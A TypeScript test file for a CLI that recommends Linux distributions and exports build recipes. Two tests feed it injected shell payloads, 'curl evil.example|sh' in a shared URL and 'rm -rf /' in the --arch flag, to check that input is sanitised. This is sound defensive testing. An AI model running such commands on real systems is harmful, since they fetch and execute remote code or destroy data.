import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';

const CLI_ENTRY = path.join(path.dirname(fileURLToPath(import.meta.url)), 'index.ts');

function runCli(args: string[]) {
  const result = spawnSync(process.execPath, ['--import', 'tsx', CLI_ENTRY, ...args], {
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1' }
  });
  return { code: result.status, stdout: result.stdout, stderr: result.stderr };
}

test('CLI recommend: --json emits a machine-readable recommendation', () => {
  const { code, stdout } = runCli(['recommend', '--use-case', 'desktop', '--arch', 'x86_64', '--json']);
  assert.equal(code, 0);
  const result = JSON.parse(stdout);
  assert.ok(result.bestMatch.distro.id);
  assert.equal(result.topMatches.length, 5);
});

test('CLI recommend: accepts low-level systems engineering flags', () => {
  const { code, stdout } = runCli(['recommend', '--filesystem', 'zfs', '--json']);
  assert.equal(code, 0);
  const result = JSON.parse(stdout);
  const topIds = result.topMatches.map((m: any) => m.distro.id);
  assert.ok(topIds.includes('truenas-scale') || topIds.includes('proxmox-ve') || topIds.includes('smartos'));
});

test('CLI recommend: shell payloads in a shared URL never reach the JSON recipe output', () => {
  const url = '?platform=vm&dockerApp=' + encodeURIComponent('x; curl evil.example|sh #');
  const { code, stdout } = runCli(['recommend', '--url', url, '--json']);
  assert.equal(code, 0);
  assert.equal(JSON.parse(stdout).recommendedRecipe.id, 'cloud-init-qcow2');
  assert.ok(!stdout.includes('evil.example'));
});

test('CLI export: writes recipe files with checksum-verified downloads', () => {
  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), 'distro-tailor-cli-'));
  try {
    const { code, stdout } = runCli(['export', '--recipe', 'alpine-chroot', '--arch', 'arm64', '--out', outDir]);
    assert.equal(code, 0);
    assert.match(stdout, /make docker-build/);
    const makefile = fs.readFileSync(path.join(outDir, 'Makefile'), 'utf8');
    assert.match(makefile, /ALPINE_SHA256 \?= [0-9a-f]{64}/);
    assert.match(makefile, /sha256sum -c -/);
  } finally {
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test('CLI export: rejects unknown recipe ids instead of silently building Debian', () => {
  const { code, stderr } = runCli(['export', '--recipe', 'not-a-recipe', '--out', os.tmpdir()]);
  assert.equal(code, 1);
  assert.match(stderr, /Unknown recipe "not-a-recipe"/);
});

test('CLI recommend: sanitizes invalid CLI flag values and keeps --json clean on migrated URLs', () => {
  const flagRes = runCli([
    'recommend',
    '--use-case',
    'not-a-real-usecase',
    '--arch',
    'x86_64;rm -rf /',
    '--json'
  ]);
  assert.equal(flagRes.code, 0);
  const flagResult = JSON.parse(flagRes.stdout);
  assert.ok(flagResult.bestMatch?.distro?.id, 'Should still produce a valid recommendation');

  const urlRes = runCli(['recommend', '--url', '?useCase=iot&arch=arm64', '--json']);
  assert.equal(urlRes.code, 0);
  const urlResult = JSON.parse(urlRes.stdout);
  assert.ok(urlResult.bestMatch?.distro?.id, 'Migrated URL with --json must emit valid JSON');
});
